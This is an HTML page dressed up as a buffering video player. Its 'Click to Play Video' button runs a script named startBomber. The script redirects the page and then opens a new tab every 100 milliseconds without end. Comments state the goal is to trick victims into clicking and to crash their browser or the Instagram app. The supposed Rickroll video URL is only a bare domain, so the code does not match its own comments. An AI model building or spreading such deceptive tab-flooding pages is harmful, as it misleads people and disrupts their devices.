<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>⚠️ Video Buffering...</h2>
    <p>Click below to authorize and play the media stream.</p>
    <!-- The trick: They MUST click this button, which unlocks browser permissions for JavaScript to open infinite tabs -->
    <button onclick="startBomber()">Click to Play Video</button>
</div>

<script>
function startBomber() {
    // 1. Direct URL to a raw Rickroll MP4 file
    const rickrollVideo = "https://github.io";

    // 2. Open the video in the current window so they see it immediately
    window.location.href = rickrollVideo;

    // 3. Infinite loop that aggressively opens new tabs with the MP4
    // This will quickly overwhelm and crash the browser/Instagram app
    setInterval(() => {
        window.open(rickrollVideo, "_blank");
    }, 100); 
}
</script>

</body>
</html>
